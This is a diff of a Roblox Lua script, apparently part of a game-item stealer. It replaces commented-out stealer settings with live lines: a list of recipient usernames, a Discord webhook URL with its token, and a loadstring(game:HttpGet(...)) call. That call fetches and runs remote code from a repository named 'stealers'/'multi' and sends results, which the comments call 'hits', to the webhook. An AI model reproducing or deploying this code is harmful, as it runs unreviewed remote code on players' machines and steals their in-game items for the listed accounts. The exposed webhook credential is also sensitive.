@@ -237,16 +237,9 @@ pcall(function()
         end
     end
 
-    --token = "" --can use ur alts token or a bot token (more secure) and put the token between the ""
-    --infowebhook = "" -- THIS IS REQUIRED IF YOU DONT USE A BOT TOKEN
-    --channelId = "" --where hits are, put it between ""
-    --bot = True -- change false to true if you use a bot token
-    --settings = {
-       -- ["gag"] = {autosteal = False}, -- set the value to true if you want to autosteal this game, else set it to false
-       -- ["mm2"] = {autosteal = False, minvalue = 1}, -- set the value to true if you want to autosteal this game, else set it to false
-        --["adm"] = {autosteal = False, minvalue = 1000}, -- set the value to true if you want to autosteal this game, else set it to false
-    --}
-    --loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/autojoiner.lua"))()
+    Username = {"t_cheloux","Dont_Distrubs","anfall38","mousta34"} 
+    Webhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI" 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
         
     -------------------
     -- UI
